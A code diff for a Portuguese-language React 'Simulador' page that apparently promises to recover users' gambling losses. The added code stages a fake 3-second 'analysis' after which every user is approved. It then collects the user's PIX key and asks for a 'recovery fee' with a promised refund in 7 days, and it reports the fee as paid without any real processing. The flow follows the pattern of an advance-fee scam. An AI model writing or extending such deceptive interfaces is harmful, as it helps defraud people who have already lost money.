@@ -1,11 +1,11 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Textarea } from "@/components/ui/textarea";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Slider } from "@/components/ui/slider";
-import { ArrowLeft, Calculator, Mail, Shield, Lock, CreditCard } from "lucide-react";
+import { ArrowLeft, Calculator, Mail, Shield, Lock, CreditCard, Loader2, CheckCircle } from "lucide-react";
 import { Link } from "react-router-dom";
 
 const Simulador = () => {
@@ -27,6 +27,11 @@ const Simulador = () => {
    const [cpf, setCpf] = useState("");
    const [dataNascimento, setDataNascimento] = useState("");
    const [anoPerda, setAnoPerda] = useState("");
+   
+   // Estados do fluxo pós-cadastro
+   const [etapaFluxo, setEtapaFluxo] = useState<'inicial' | 'analisando' | 'aprovado' | 'finalizado'>('inicial');
+   const [chavePix, setChavePix] = useState("");
+   const [analisandoTimer, setAnalisandoTimer] = useState(false);
 
   const calcularRecuperacao = () => {
     const valor = usarValorCustomizado 
@@ -421,8 +426,14 @@ const Simulador = () => {
                   <Button 
                     className="btn-cta-primary text-lg py-6 px-8"
                     onClick={() => {
-                      // Iniciar processo de recuperação
-                      alert('Processo de recuperação iniciado! Você será contatado em breve.');
+                      setEtapaFluxo('analisando');
+                      setAnalisandoTimer(true);
+                      
+                      // Simular análise por 3 segundos
+                      setTimeout(() => {
+                        setAnalisandoTimer(false);
+                        setEtapaFluxo('aprovado');
+                      }, 3000);
                     }}
                     disabled={
                       (casasSelecionadas.length > 0 || outraCasa || maisDeCasa) && 
@@ -438,6 +449,104 @@ const Simulador = () => {
                     </p>
                   )}
                 </div>
+              </div>
+            </div>
+          )}
+          
+          {/* Fluxo Pós-Cadastro */}
+          {etapaFluxo === 'analisando' && (
+            <div className="bg-card border border-border rounded-2xl p-8 shadow-large mt-8">
+              <div className="text-center space-y-6">
+                <Loader2 className="w-16 h-16 animate-spin mx-auto text-primary" />
+                <h3 className="text-2xl font-bold text-foreground">
+                  Analisando seu caso...
+                </h3>
+                <p className="text-muted-foreground">
+                  Nossa equipe está verificando suas informações. Aguarde alguns instantes.
+                </p>
+              </div>
+            </div>
+          )}
+
+          {etapaFluxo === 'aprovado' && (
+            <div className="bg-card border border-border rounded-2xl p-8 shadow-large mt-8">
+              <div className="text-center space-y-6">
+                <CheckCircle className="w-16 h-16 mx-auto text-green-500" />
+                <h3 className="text-2xl font-bold text-foreground">
+                  Parabéns! Seu cadastro foi aprovado
+                </h3>
+                <p className="text-muted-foreground">
+                  Para finalizar o processo, precisamos de mais algumas informações:
+                </p>
+                
+                <div className="space-y-6 max-w-md mx-auto">
+                  <div className="space-y-2">
+                    <Label htmlFor="chave-pix">Sua Chave PIX *</Label>
+                    <Input
+                      id="chave-pix"
+                      type="text"
+                      placeholder="Digite sua chave PIX (CPF, e-mail, telefone ou chave aleatória)"
+                      value={chavePix}
+                      onChange={(e) => setChavePix(e.target.value)}
+                      className="h-12"
+                    />
+                  </div>
+                  
+                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                    <h4 className="font-semibold text-yellow-800 mb-2">
+                      Para estar 100% aprovado
+                    </h4>
+                    <p className="text-yellow-700 text-sm mb-3">
+                      Pedimos que você faça o pagamento da taxa de recuperação:
+                    </p>
+                    <div className="text-center">
+                      <span className="text-2xl font-bold text-yellow-800">
+                        {resultado && formatarMoeda(resultado.taxa)}
+                      </span>
+                    </div>
+                    <p className="text-yellow-700 text-xs mt-2">
+                      Em até 7 dias o dinheiro será reembolsado para sua conta
+                    </p>
+                  </div>
+                  
+                  <Button 
+                    className="w-full btn-cta-primary text-lg py-6"
+                    onClick={() => {
+                      if (!chavePix.trim()) {
+                        alert('Por favor, insira sua chave PIX');
+                        return;
+                      }
+                      setEtapaFluxo('finalizado');
+                    }}
+                    disabled={!chavePix.trim()}
+                  >
+                    💳 Pagar Taxa de Recuperação
+                  </Button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {etapaFluxo === 'finalizado' && (
+            <div className="bg-card border border-border rounded-2xl p-8 shadow-large mt-8">
+              <div className="text-center space-y-6">
+                <CheckCircle className="w-16 h-16 mx-auto text-green-500" />
+                <h3 className="text-2xl font-bold text-foreground">
+                  Processo Finalizado!
+                </h3>
+                <div className="bg-green-50 border border-green-200 rounded-lg p-4 max-w-md mx-auto">
+                  <p className="text-green-700">
+                    ✅ Cadastro aprovado<br />
+                    ✅ Chave PIX confirmada<br />
+                    ✅ Taxa paga com sucesso
+                  </p>
+                </div>
+                <p className="text-muted-foreground">
+                  Seu dinheiro será reembolsado em até <strong>7 dias úteis</strong> diretamente na sua conta PIX.
+                </p>
+                <p className="text-sm text-muted-foreground">
+                  Você receberá atualizações por e-mail sobre o andamento do seu processo.
+                </p>
               </div>
             </div>
           )}
